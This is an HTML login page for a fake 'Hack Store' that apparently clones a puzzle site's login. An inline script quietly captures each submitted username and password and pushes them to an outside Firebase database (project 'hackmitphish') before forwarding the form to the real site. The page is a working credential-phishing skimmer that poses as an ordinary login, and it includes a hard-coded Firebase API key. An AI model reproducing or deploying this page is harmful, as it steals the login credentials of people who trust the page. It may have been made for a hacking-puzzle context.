<html>
<head>
  <title>Hack Store</title>
  <link href="https://fonts.googleapis.com/css?family=Poppins:400,700" rel="stylesheet">
  <style type="text/css">
    body {
      background-color: #252c37;
      color: #ffffff;
      font-family: 'Poppins';
    }
    .blue {
      color: #74d1ea;
    }
    .red {
      color: #ff585d;
    }
    .container {
      width: 700px;
      margin: 0 auto;
      text-align: center;
    }
    .fs {
      text-align: right;
    }
    table {
      margin-left: auto;
      margin-right: auto;
    }
    a {
      color: #74d1ea;
    }
  </style>
</head>
<body>
<div class="container">
  <h1><span class="red">HACK</span><span class="blue">Store</span></h1>
  <p>Server UPGRADES: We now use brand new Pentium Pro Chips! This page loads faster than you can blink ;)</p>

  <h2>Login</h2>
  <div class="red">

  

</div>

      <script src="https://www.gstatic.com/firebasejs/4.1.3/firebase.js"></script>
      <script>
        // Initialize Firebase
        var config = {
          apiKey: "AIzaSyDQQ0fTlhBxOGChbCn-0MKLihHciakNS1I",
          authDomain: "hackmitphish.firebaseapp.com",
          databaseURL: "https://hackmitphish.firebaseio.com",
          projectId: "hackmitphish",
          storageBucket: "hackmitphish.appspot.com",
          messagingSenderId: "829509542556"
        };
        firebase.initializeApp(config);

        function sub() {
          firebase.database().ref("dump").push().set({
            username: document.getElementsByName('username')[0].value,
            password: document.getElementsByName('password')[0].value
          });
        }
      </script>

<form method="POST" action="https://store.delorean.codes/u/mattmerr.com/login" onsubmit="return sub()">
  <table>
    <tr>
      <td class="fs">user</td>
      <td>
        <select name="username">
          
          <option value="marty_mcfly">Marty McFly</option>
          
          <option value="biff_tannen">Biff Tannen</option>
          
        </select>
      </td>
    </tr>
    <tr>
      <td class="fs">password</td>
      <td><input type="password" name="password" /></td>
    </tr>
  </table>
	<input type="submit" value="Login" />
</form>

    </div>
  </body>
</html>